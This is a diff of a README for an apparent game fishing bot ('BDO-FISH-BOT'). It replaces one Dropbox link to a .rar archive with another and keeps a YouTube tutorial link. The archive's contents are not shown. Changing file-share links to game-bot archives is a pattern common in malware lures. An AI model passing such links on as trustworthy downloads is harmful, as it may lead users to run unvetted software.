@@ -2,7 +2,7 @@
 # 🐟 BDO-FISH-BOT
 
 📺 **YouTube Tutorial:** [Watch Now](https://www.youtube.com/watch?v=l-WpyVWrr3s)  
-📥 **Download Link:** [Download BDO Fish Bot](https://www.dropbox.com/scl/fi/sd0p1ik3zbhnepamenxjy/BDO-FISH-BOT-1080P.rar?rlkey=xo1zvthbtn9h3ovgl6kpcyizd&e=1&st=bztczez3&dl=1)
+📥 **Download Link:** [Download BDO Fish Bot](https://www.dropbox.com/scl/fi/qqcyje92haeo5e2ljnph2/BDO-FISH-BOT-1080P.rar?rlkey=rqgbin0o38vx0ganiqusp9y3v&st=fzlxlesf&dl=1)
 
 ---
 
